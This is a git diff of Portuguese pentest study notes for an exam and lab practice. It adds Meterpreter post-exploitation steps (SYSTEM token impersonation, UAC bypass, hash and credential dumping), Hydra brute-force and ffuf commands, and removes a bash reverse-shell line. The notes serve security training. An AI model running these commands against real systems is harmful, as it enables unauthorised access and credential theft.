@@ -25,8 +25,18 @@ nmap -oN scan.txt -oX scan.xml <IP>
 
 ## 💣 Metasploit
 
+Como procurar payloads (Meterpreter):
+
 ```bash
-use exploit/multi/handler              # fazer shell dentro do msfconsole
+show payloads 
+
+search type:payload meterpreter
+```
+
+Uso comum:
+
+```bash
+use exploit/multi/handler                    # fazer shell dentro do msfconsole
 use post/multi/manage/shell_to_meterpreter   # melhorar a shell
 use post/multi/recon/local_exploit_suggester # sugestão para exploit local
 ```
@@ -46,14 +56,9 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 python -c 'import os; os.system("/bin/bash")'
 ```
 
-```bash
-export TERM=xterm
-stty rows 40 columns 120
-```
-
 ---
 
-## 🔐 Privilege Escalation
+## 🔐 Privilege Escalation - Linux
 
 ```bash
 whoami
@@ -65,6 +70,107 @@ sudo -l
 find / -perm -4000 -type f 2>/dev/null
 getcap -r / 2>/dev/null
 ps aux | grep root
+```
+
+## PrivEsc Windows 
+
+```bash
+whoami
+whoami /priv
+whoami /groups
+
+systeminfo
+hostname
+ver
+
+net user
+net localgroup
+net localgroup administrators
+
+cmdkey /list
+runas /?
+
+dir C:\ /s /b | findstr /i "password"
+dir C:\ /s /b | findstr /i ".config .xml .ini .txt"
+
+tasklist /v
+
+ipconfig /all
+netstat -ano
+route print
+arp -a
+
+net share
+
+
+# 🪟 Windows DIR Cheat Sheet 🔹 Básico
+- `dir` → lista arquivos do diretório atual
+- `dir /s` → busca recursiva (subpastas)
+- `dir /b` → saída limpa (somente caminhos)
+- `dir /a` → inclui arquivos ocultos e de sistema
+- `dir /q` → mostra dono do arquivo
+```
+
+### metasploit
+
+```bash
+# =========================
+# 🔎 ENUM BÁSICA
+# =========================
+getuid
+sysinfo
+getprivs
+
+# =========================
+# 🔥 TENTATIVA AUTOMÁTICA
+# =========================
+getsystem
+
+# =========================
+# 🎭 TOKEN IMPERSONATION
+# =========================
+load incognito
+list_tokens -u
+impersonate_token "NT AUTHORITY\\SYSTEM"
+
+# =========================
+# 🧨 BYPASS UAC (SE FOR ADMIN)
+# =========================
+background
+use exploit/windows/local/bypassuac
+set SESSION <ID>
+run
+
+# =========================
+# 🔐 DUMP DE HASHES
+# =========================
+hashdump
+
+# =========================
+# 🧠 PÓS-EXPLORAÇÃO
+# =========================
+ps
+migrate <PID>
+
+# =========================
+# 📂 COLETA DE DADOS
+# =========================
+ls
+pwd
+download <arquivo>
+
+# =========================
+# 🌐 REDE / MOVIMENTO LATERAL
+# =========================
+ipconfig
+arp
+netstat
+
+# =========================
+# 💀 EXTRA (SE TIVER PRIV)
+# =========================
+load kiwi
+creds_all
 ```
 
 ---
@@ -88,12 +194,45 @@ config.old
 backup.sql
 ```
 
----
-
 ## 📥 Wget (Mirror)
 
 ```bash
 wget -r -np -nH --cut-dirs=1 <URL>   # baixar arquivos em modo mirror
+```
+
+---
+
+## 🔓 Brute Force / Enumeração Ativa
+
+As Wordlists mais usadas no curso estão no path: `/usr/share/wordlists/metasploit`
+
+### 💣 Hydra
+
+```bash
+# SSH
+hydra -l <user> -P wordlist.txt ssh://<IP>
+
+# FTP
+hydra -l <user> -P wordlist.txt ftp://<IP>
+
+# HTTP POST login
+hydra -l <user> -P wordlist.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
+```
+
+### 🚀 FFUF
+
+```bash
+# Descoberta de diretórios
+ffuf -u http://<IP>/FUZZ -w wordlist.txt
+
+# Extensões
+ffuf -u http://<IP>/FUZZ -w wordlist.txt -e .php,.txt,.bak
+
+# Virtual hosts
+ffuf -u http://<IP> -H "Host: FUZZ.<domain>" -w wordlist.txt
+
+# Filtrar por tamanho
+ffuf -u http://<IP>/FUZZ -w wordlist.txt -fs 0
 ```
 
 ---
@@ -112,24 +251,7 @@ while read -r share; do
   echo "[+] Successfully accessed share: $share"
 done < /root/Desktop/wordlists/shares.txt
 ```
----
 
-## 🔓 Brute Force / Enumeração Ativa
-
-### 💣 Hydra
-
-```bash
-# SSH
-hydra -l <user> -P wordlist.txt ssh://<IP>
-
-# FTP
-hydra -l <user> -P wordlist.txt ftp://<IP>
-
-# HTTP POST login
-hydra -l <user> -P wordlist.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
-```
-
----
 
 ### 🧨 CrackMapExec
 
@@ -143,25 +265,6 @@ crackmapexec smb <IP> -u <user> -p <pass>
 # Executar comando
 crackmapexec smb <IP> -u <user> -p <pass> -x "whoami"
 ```
-
----
-
-### 🚀 FFUF
-
-```bash
-# Descoberta de diretórios
-ffuf -u http://<IP>/FUZZ -w wordlist.txt
-
-# Extensões
-ffuf -u http://<IP>/FUZZ -w wordlist.txt -e .php,.txt,.bak
-
-# Virtual hosts
-ffuf -u http://<IP> -H "Host: FUZZ.<domain>" -w wordlist.txt
-
-# Filtrar por tamanho
-ffuf -u http://<IP>/FUZZ -w wordlist.txt -fs 0
-```
-
 
 ---
 
@@ -208,8 +311,6 @@ _Pode ser utilizado após upload via WebDAV ou outras falhas de upload para obte
 
 ---
 
-⚠️ _Sempre valide a vulnerabilidade antes da exploração e priorize métodos que gerem menos ruído (stealth)._
-
 ```bash
 ip a
 route -n
@@ -228,21 +329,6 @@ _No momento que a prova iniciar é importante que tenha uma planilha com os segu
 
 | Nome do host | IP | Serviços | Credenciais | Vulnerabilidades | Observações |
 |--------------|----|----------|-------------|------------------|-------------|
-
----
-
-## 🧠 Enumeração
-
-_Não ignore os outputs do NMAP ou dos outros scanners como SMBmap, crackmapexec ou enum4linux..._
-
-_As creds podem ser reutilizadas em diversos serviços (ex: SMB → RDP)_
-
-_Isso indica ambiente híbrido (Linux + Windows)_
-
-Ferramentas:
-- smbmap
-- crackmapexec
-- enum4linux
 
 ---
 
@@ -278,19 +364,6 @@ FLAG1{23c7d4bababf8048c0cda5136ac83c9e}
 ```
 
 ---
-
-## ⚡ Extras
-
-```bash
-# Transferência de arquivos
-python3 -m http.server 8000
-```
-
-```bash
-# Reverse shell
-bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
-```
-
 
 # 🧠 TryHackMe - Controle de Estudos
 
